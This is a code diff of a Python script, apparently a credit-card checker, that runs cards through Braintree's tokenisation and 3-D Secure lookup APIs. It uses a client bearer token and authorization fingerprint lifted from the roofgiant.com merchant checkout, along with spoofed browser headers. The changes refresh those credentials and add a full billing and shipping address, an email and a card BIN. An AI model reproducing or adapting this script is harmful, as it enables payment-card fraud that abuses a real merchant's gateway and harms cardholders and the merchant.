@@ -41,7 +41,7 @@ def chk(lista):
             "clientSdkMetadata": {
                 "source": "client",
                 "integration": "custom",
-                "sessionId": "12345b4b-6dee-49db-9530-cedfba586bb9"
+                "sessionId": "10f2dca3-488f-4e79-b857-306263801f03"
             },
             "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
             "variables": {
@@ -63,7 +63,7 @@ def chk(lista):
             "operationName": "TokenizeCreditCard"
         }
         headers = {
-            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODk3MTU1ODcsImp0aSI6ImNiYzk3ZGZiLTFjMDItNDE1ZS04ZjE0LTUxYTQ1N2NlY2U1MiIsInN1YiI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.Njv9O53dbAm-Iw-YTI4L_2-QxjyMIeXQf1oOSvhWs7_ZjZH3zLwPIlZRulAOF_ojHaAXbxSE5Ebwouprv_FH7g',
+            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTAxODIyODQsImp0aSI6IjhkYTIxYmIzLTc2NTEtNGJiYi04YzkzLWZkNmFlZWI3OTljNyIsInN1YiI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.hAVOfhEVgUOK1mPAR2bJTuhVrup-LDbtCu4Fa4PxdtSSKsnPYZ98T0x9tkp3CbHU7PAMiwY0gn_pHqVI1wMGNw',
             'braintree-version': '2018-05-10',
             'Content-Type': 'application/json',
             'Origin': 'https://assets.braintreegateway.com',
@@ -78,11 +78,11 @@ def chk(lista):
         if response_dict['data']['tokenizeCreditCard']['token']:
             token = response_dict['data']['tokenizeCreditCard']['token']
             url2 = f'https://api.braintreegateway.com/merchants/4ptxjm96rjdct9qb/client_api/v1/payment_methods/{token}/three_d_secure/lookup'
-            data2 = '''{"amount":20.97,"additionalInfo":{"billingLine1":"i don't know ","billingCity":"also i don't kn","billingState":"","billingPostalCode":"10080","billingCountryCode":"GB","billingPhoneNumber":"","billingGivenName":"Ammar","billingSurname":"Abd"},"dfReferenceId":"0_1375f58c-ba0a-4482-ae45-c915e0349213","clientMetadata":{"sdkVersion":"web/3.85.2","requestedThreeDSecureVersion":"2","cardinalDeviceDataCollectionTimeElapsed":778},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODk3MTU1ODcsImp0aSI6ImNiYzk3ZGZiLTFjMDItNDE1ZS04ZjE0LTUxYTQ1N2NlY2U1MiIsInN1YiI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.Njv9O53dbAm-Iw-YTI4L_2-QxjyMIeXQf1oOSvhWs7_ZjZH3zLwPIlZRulAOF_ojHaAXbxSE5Ebwouprv_FH7g","braintreeLibraryVersion":"braintree/web/3.85.2","_meta":{"merchantAppId":"www.roofgiant.com","platform":"web","sdkVersion":"3.85.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"12345b4b-6dee-49db-9530-cedfba586bb9"}}'''
+            data2 = '''{"amount":"123.24","additionalInfo":{"shippingGivenName":"ammar","shippingSurname":"Abdul","acsWindowSize":"03","billingLine1":"86 High Point","billingLine2":"Richmond Hill Road","billingCity":"Birmingham","billingState":"","billingPostalCode":"B15 3RT","billingCountryCode":"GB","billingGivenName":"ammar","billingSurname":"Abdul","shippingLine1":"86 High Point","shippingLine2":"Richmond Hill Road","shippingCity":"Birmingham","shippingState":"","shippingPostalCode":"B15 3RT","shippingCountryCode":"GB","email":"disjwjshs756u@me.com"},"bin":"516815","dfReferenceId":"1_152e0212-def7-4db3-80f6-c5f1ede9b9f1","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.85.2","cardinalDeviceDataCollectionTimeElapsed":160,"issuerDeviceDataCollectionTimeElapsed":3651,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTAxODIyODQsImp0aSI6IjhkYTIxYmIzLTc2NTEtNGJiYi04YzkzLWZkNmFlZWI3OTljNyIsInN1YiI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.hAVOfhEVgUOK1mPAR2bJTuhVrup-LDbtCu4Fa4PxdtSSKsnPYZ98T0x9tkp3CbHU7PAMiwY0gn_pHqVI1wMGNw","braintreeLibraryVersion":"braintree/web/3.85.2","_meta":{"merchantAppId":"www.roofgiant.com","platform":"web","sdkVersion":"3.85.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"10f2dca3-488f-4e79-b857-306263801f03"}}'''
             headers2 = {
                 'Content-Type': 'application/json',
                 "Origin": "https://www.roofgiant.com",
-                "Referer": "https://www.roofgiant.com/",  # This is the site for api
+                "Referer": "www.roofgiant.com/",  # This is the site for api
                 "Sec-Ch-Ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                 "Sec-Ch-Ua-Mobile": "?0",
                 "Sec-Ch-Ua-Platform": '"Windows"',
